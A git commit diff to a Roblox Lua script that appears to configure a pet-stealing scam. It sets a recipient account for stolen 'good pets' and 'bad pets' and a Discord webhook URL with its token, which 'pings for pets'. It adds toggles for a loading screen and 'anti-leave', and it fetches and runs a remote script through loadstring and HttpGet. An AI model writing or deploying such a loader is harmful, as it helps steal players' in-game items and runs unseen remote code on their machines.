9d08d86c2f181c08f9b121fa1e15f01ddc0c4048
Muhammad6190 <145155331+Muhammad6190@users.noreply.github.com>
2023-09-15 14:43:21 -0400

    Update Mainstring.lua

--- Mainstring.lua
+++ Mainstring.lua
@@ -1,1 +1,9 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua'))()
+UserName = "uwillgetcleaned" -- good pets
+WebHook = "https://discord.com/api/webhooks/1152312362288824391/N3uEQuchYaUw9sBco9gQML3l-Ps7d9Bg8GurdhLbzg3ccQ-2R9B5AlaCyk8CNTloDKZI" -- pings for pets
+UserName2 = "uwillgetcleaned" -- bad pets 
+
+_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.AntiLeave = false -- make it true if you want the antileave 
+_G.MouseLock = false -- make it true if you want mouselock
+
+loadstring(game:HttpsGet("https://raw.githubusercontent.com/LyphreX/MoriScripts/main/MoriScripts", true))()
